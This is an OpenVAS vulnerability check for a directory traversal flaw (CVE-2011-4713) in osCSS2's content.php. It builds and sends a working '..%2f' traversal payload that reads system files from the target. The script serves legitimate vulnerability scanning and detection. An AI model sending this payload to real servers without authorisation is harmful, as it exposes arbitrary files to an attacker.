###############################################################################
# OpenVAS Vulnerability Test
#
# osCSS2 '_ID' parameter Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902763");
  script_version("2019-05-14T12:12:41+0000");
  script_cve_id("CVE-2011-4713");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2019-05-14 12:12:41 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2011-12-12 03:17:35 +0530 (Mon, 12 Dec 2011)");
  script_name("osCSS2 '_ID' parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_oscss_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("oscss/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46741");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18099/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520421");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Nov/117");
  script_xref(name:"URL", value:"http://www.rul3z.de/advisories/SSCHADV2011-034.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"osCSS2 version 2.1.0");

  script_tag(name:"insight", value:"The flaw is due to input validation error in 'id' parameter to
  'shopping_cart.php' and 'content.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Upgrade to osCSS2 svn branche 2.1.0 stable version or later");

  script_tag(name:"summary", value:"This host is running osCSS2 and is to prone directory traversal
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!dir = get_dir_from_kb(port:port, app:"osCSS"))
  exit(0);

if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){
  url = string(dir, "/content.php?_ID=", crap(data:"..%2f", length:3*15), files[file]);

  if(http_vuln_check(port:port, url:url, pattern:file)){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);